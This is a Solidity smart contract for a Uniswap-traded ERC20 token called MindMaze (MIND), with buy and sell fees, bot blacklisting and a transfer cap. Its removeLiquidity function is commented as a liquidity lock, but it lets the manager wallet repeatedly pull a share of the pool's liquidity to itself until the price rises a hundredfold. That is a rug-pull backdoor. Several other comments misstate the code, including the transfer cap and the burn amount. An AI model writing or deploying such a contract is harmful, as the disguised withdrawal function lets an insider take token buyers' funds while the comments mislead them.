// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

/**  
@dev 
MIND token will take 7% fees for each sell (3% marketing, 3% dev, 1% burn) 
MIND token will take 5% fees for each buy (2% marketing, 2% dev, 1% burn) 
*/
contract Mind is Ownable, ERC20 {
    error BotAlreadyAdded();
    error AccountIsUniswapRouter();
    error AccountIsPair();
    error SenderIsBot();
    error RecipientIsBot();
    error AlreadyCalled();
    error NotManager();
    error ExceedsMaxTxAmount();
    error InSwap();
    error SenderAddressIsZero();
    error RecipientrAddressIsZero();
    error InsufficientBalance();
    error UnableToGetWethBalance();
    error LiquidityLocked();

    IUniswapV2Router02 private immutable _router;

    address public pair;
    address payable public marketingWallet;
    address payable public devWallet;
    address public managerWallet;

    bool public tradingActive;
    bool private _liquidityAdded;
    bool internal _inSwap;

    uint256 private constant SWAP_FEES_AT = 1000 ether;
    uint256 private _totalSupply;
    uint256 private _initialLiquidityWeth;

    //anti bot, check tradings that started the same block when liquidity is added
    uint256 public tradingStartBlock;

    mapping(address => bool) public taxExcluded;
    mapping(address => bool) public bot;
    mapping(address => uint256) private _balances;

    modifier lockSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    modifier onlyManager() {
        if(_msgSender() != managerWallet) revert NotManager();
        _;
    }

    constructor(
        address uniswapFactory,
        address uniswapRouter,
        address payable marketing,
        address payable dev,
        address manager
    ) ERC20('MindMaze', 'MIND') {
        taxExcluded[marketing] = true;
        taxExcluded[dev] = true;
        taxExcluded[manager] = true;
        taxExcluded[address(this)] = true;
        marketingWallet = marketing;
        devWallet = dev;
        managerWallet = manager;
        _router = IUniswapV2Router02(uniswapRouter);
        IUniswapV2Factory uniswapContract = IUniswapV2Factory(uniswapFactory);
        pair = uniswapContract.createPair(address(this), _router.WETH());
    }

    function addLiquidity(uint256 tokens) external payable onlyOwner {
        if (_liquidityAdded) revert AlreadyCalled();
        _liquidityAdded = true;
        _mint(address(this), tokens);

        //set the tokens for dev and marketing, 2.5% each
        _rawTransfer(address(this), marketingWallet, tokens*25/1000); //2.5%
        _rawTransfer(address(this), devWallet, tokens*25/1000); //2.5%

        _addLiquidity(balanceOf(address(this)), msg.value);
        

        if (!tradingActive) {
            tradingActive = true;
            tradingStartBlock = block.number;
        }
    }

    //lock liquidity if weth balance of pair is 100x from initial weth liquidity provided
    function removeLiquidity() external onlyManager() {
        uint256 target = _initialLiquidityWeth * 100;
        address weth = _router.WETH();

        uint256 pairWethBalance = ERC20(weth).balanceOf(pair);

        if(pairWethBalance >= target) revert LiquidityLocked();

        _removeLiquidity();
    }

    function _addLiquidity(uint256 tokens, uint256 value) private {
        _approve(address(this), address(_router), tokens);
        (, uint amountETH, ) = _router.addLiquidityETH{value: value}(
            address(this),
            tokens,
            0,
            0,
            address(this),
            // solhint-disable-next-line not-rely-on-time
            block.timestamp
        );
        _initialLiquidityWeth = amountETH;
    }

    function _removeLiquidity() private {
        uint256 amount = ERC20(pair).balanceOf(address(this));
        ERC20(pair).approve(address(_router), type(uint256).max);
        _router.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(this), 
            amount/10, 
            1, 
            1, 
            managerWallet, 
            block.timestamp
        );
    }

    function addTaxExcluded(address account) public onlyManager {
        taxExcluded[account] = true;
    }

    function removeTaxExcluded(address account) public onlyManager {
        taxExcluded[account] = false;
    }

    function _addBot(address account) private {
        if (bot[account]) revert BotAlreadyAdded();
        if (account == address(_router)) revert AccountIsUniswapRouter();
        if (account == pair) revert AccountIsPair();
        bot[account] = true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal override {
        if (taxExcluded[sender] || taxExcluded[recipient] || !tradingActive) {
            _rawTransfer(sender, recipient, amount);
            return;
        }
        
        //anti bot
        if (bot[sender]) revert SenderIsBot();
        if (bot[recipient]) revert RecipientIsBot();

        //locked in swap
        if(_inSwap) revert InSwap();

        //Anti whale 
        uint256 maxTxAmount = totalSupply() * 5 / 1000; //max 5% transfer
        if(amount > maxTxAmount) revert ExceedsMaxTxAmount();

        uint256 send = amount;  // i.e: 1000 MIND 

        //calculate fees in both sell and buy
        if (sender == pair && tradingActive) {
            //buy 5% fees
            uint256 takeFees = amount * 5 / 100;
            _rawTransfer(pair, address(this), takeFees);
            send -= takeFees;
            
        } else if (recipient == pair && tradingActive) {
            //sell 7% fees
            uint256 takeFees = amount * 7 / 100;
            _rawTransfer(sender, address(this), takeFees);
            send -= takeFees;
        }

        //transfer remaining
        _rawTransfer(sender, recipient, send);

        //swap when balance reaches 1000 MIND
        if(balanceOf(address(this)) >= SWAP_FEES_AT) {
            _swap();
        }

        //add bot
        if (tradingActive && block.number == tradingStartBlock && !taxExcluded[tx.origin]) {
            if (tx.origin == address(pair)) {
                if (sender == address(pair)) {
                    _addBot(recipient);
                } else {
                    _addBot(sender);
                }
            } else {
                _addBot(tx.origin);
            }
        }
    }

    // modified from OpenZeppelin ERC20
    function _rawTransfer(address sender, address recipient, uint256 amount) private {
        if(sender == address(0)) revert SenderAddressIsZero();
        if(recipient == address(0)) revert RecipientrAddressIsZero();

        uint256 senderBalance = balanceOf(sender);
        if(senderBalance < amount) revert InsufficientBalance();
        unchecked {
            _subtractBalance(sender, amount);
        }
        _addBalance(recipient, amount);

        emit Transfer(sender, recipient, amount);
    }

    function _addBalance(address account, uint256 amount) private {
        _balances[account] += amount;
    }

    function _subtractBalance(address account, uint256 amount) private {
        _balances[account] -= amount;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function _swap() internal lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();

        uint256 amount = SWAP_FEES_AT;

        //burn 1%, 10 MIND
        _burn(address(this), 10);

        amount -= 10;
        _approve(address(this), address(_router), amount);

        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    //50% fees for marketing, 50% fees for dev
    function withdrawFees() external {
        uint256 contractEthBalance = address(this).balance;
        marketingWallet.transfer(contractEthBalance/2);
        devWallet.transfer(address(this).balance);
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function _mint(address account, uint256 amount) internal override {
        _totalSupply += amount;
        _addBalance(account, amount);
        emit Transfer(address(0), account, amount);
    }

    function burn(uint256 amount) external {
        if(balanceOf(_msgSender()) < amount) revert InsufficientBalance();
        _burn(_msgSender(), amount);
    }

    function _burn(address account, uint256 amount) internal override {
        _totalSupply -= amount;
        unchecked {
            _subtractBalance(account, amount);
        }
        emit Transfer(account, address(0), amount);
    }

    receive() external payable {}
}
